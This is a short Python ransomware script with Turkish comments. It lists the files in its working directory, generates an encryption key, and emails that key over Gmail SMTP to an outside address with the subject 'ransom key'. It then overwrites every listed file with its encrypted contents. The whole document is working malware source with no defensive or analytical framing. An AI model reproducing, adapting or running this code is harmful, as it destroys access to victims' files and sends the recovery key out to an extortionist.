import os
import smtplib
from email.mime.text import MIMEText
from cryptography.fernet import Fernet

def send_email(subject, body, to_address, attachment_data=None):
    from_address = '*@gmail.com'  # Kendi e-posta adresinizi girin
    password = '*.'  # E-posta şifrenizi girin

    msg = MIMEText(body)
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = subject

    if attachment_data:
        part = MIMEText(attachment_data, 'base64')
        part.add_header('Content-Disposition', f'attachment; filename=generatedkey.key')
        msg.attach(part)

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(from_address, password)
        server.sendmail(from_address, to_address, msg.as_string())


files = []
for file in os.listdir():
    if file == "ransom.py" or file == "generatedkey.key" or file == "ransomdecrypter.py":
        continue
    if os.path.isfile(file):
        files.append(file)


key = Fernet.generate_key()


send_email(subject='Fidye Anahtarı', body=f'Fidye anahtarı: {key.decode()}', to_address='res4ad0@gmail.com', attachment_data=key.decode())

for file in files:
    with open(file, "rb") as the_file:
        contents = the_file.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as the_file:
        the_file.write(contents_encrypted)
